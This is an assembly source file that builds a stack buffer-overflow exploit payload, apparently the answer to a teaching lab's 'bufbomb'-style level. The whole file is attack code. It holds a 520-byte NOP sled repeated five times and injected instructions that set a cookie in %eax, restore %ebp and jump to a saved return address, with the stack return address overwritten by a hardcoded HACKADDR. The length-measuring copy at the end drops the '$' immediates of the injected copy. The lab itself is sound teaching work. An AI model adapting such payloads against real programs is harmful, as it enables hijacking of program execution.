COOKIE   = 0x7d97e567
RETADDR  = 0x08048de5
HACKADDR = 0x55683328
HACKLEN  = HACK_END - HACK_BEGIN - 1

.rept 5
    .fill (520 - HACKLEN), 1, 0x90

    mov $COOKIE, %eax
    lea 0x18(%esp), %ebp
    push $RETADDR
    ret

    .long 0
    .long HACKADDR

    .byte 0x0a
.endr

HACK_BEGIN:
    mov COOKIE, %eax
    lea 0x18(%esp), %ebp
    push RETADDR
    ret
HACK_END:
